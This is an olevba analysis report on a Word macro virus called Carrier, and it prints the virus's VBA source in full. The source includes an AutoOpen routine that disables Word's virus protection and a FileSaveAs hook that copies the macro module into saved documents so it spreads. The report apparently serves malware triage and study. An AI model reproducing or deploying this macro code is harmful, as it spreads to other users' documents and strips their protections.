olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Carrier-ebf64f26e356f67a94ca237fad9bb0a87cb5517e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Carrier-ebf64f26e356f67a94ca237fad9bb0a87cb5517e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Agent.bas 
in file: Virus.MSWord.Carrier-ebf64f26e356f67a94ca237fad9bb0a87cb5517e - OLE stream: 'Macros/VBA/Agent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Options.VirusProtection = False

For x = 1 To Word.Windows.Count

Word.Windows.Item(x).Caption = " Infected by the Carrier virus (a trooper has already landed)"

Next x

End Sub

Sub FileSaveAs()

Dialogs(wdDialogFileSaveAs).Show

If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate

Application.OrganizerCopy Normaltemplate.FullName, ActiveDocument.FullName, Trooper, wdOrganizerObjectProjectItems

ActiveDocument.Save

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

